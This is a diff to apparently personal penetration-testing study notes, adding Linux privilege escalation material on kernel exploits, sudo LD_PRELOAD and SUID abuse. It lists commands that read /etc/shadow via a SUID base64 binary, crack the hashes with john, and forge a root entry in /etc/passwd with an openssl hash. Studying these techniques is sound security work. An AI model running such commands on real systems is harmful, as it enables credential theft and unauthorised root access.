@@ -2718,7 +2718,7 @@ Privilege Escalation
         Enumeration
             The first step you have to take once you gain access to any system
 
- 
+
             hostname
                 Although this value can easily be changed or have a relatively meaningless string
                 In some cases, it can provide information about the target system's role within the corporate network
@@ -2846,10 +2846,69 @@ Privilege Escalation
                     find / -perm -u=s -type f 2>/dev/null
 
 
-        General Linux Commands
+            General Linux Commands
 
-            find, locate, grep, cut, sort, etc.
- 
+                find, locate, grep, cut, sort, etc.
+
+
+        Kernel Exploits
+
+            The kernel exploit methodology is Kernel exploit methodology is simple
+                1. Identify the kernel version
+                2. Search and find an exploit code for the kernel version of the target system
+                3. Run the exploit
+
+            You can transfer the exploit from your machine to the target using http.server and wget (cd /tmp)
+
+            A failed kernel exploit can lead to a system crash
+
+
+        Sudo
+
+            sudo -l
+                gtfobins.github.io
+
+                Leverage LD_PRELOAD
+                    On some systems, you may see the LD_PRELOAD environment option (env_keep)
+                    If enabled we can generate a shared library which will be loaded and executed before the program is run
+
+
+        SUID
+
+            Set-user Identification and Set-group Identification
+                Allow files to be executed with the permission level of the file owner or the group owner
+                You will notice these files have an "s" bit set showing their special permission level
+
+                    find / -type f -perm -04000 -ls 2>/dev/null
+
+                        gtfobins.github.io
+
+
+                    If base64 (for example) has the SUID bit set
+
+                        cd /tmp; mkdir serve; cd serve
+                        cat /etc/passwd > a.txt
+                        base64 /etc/shadow | base64 --decode > b.txt
+
+                            unshadow a.txt b.txt > c.txt
+                            john c.txt rockyou.txt
+                            john --show c.txt
+
+
+                    The other option would be to add a new user that has root privileges
+
+                        We will need the hash value of the password we want the user to have
+                        This can be done quicky using the openssl tool on Kali Linux
+
+                            openssl passwd -1 -salt theName thePassword
+
+                                -1  MD5
+                                -5  SHA256
+                                -6  SHA512
+
+                        We will need to add this password with a username to the /etc/passwd file
+                            root:/bin/bash to provide a root shell
+
 
 
     Windows Privilege Escalation
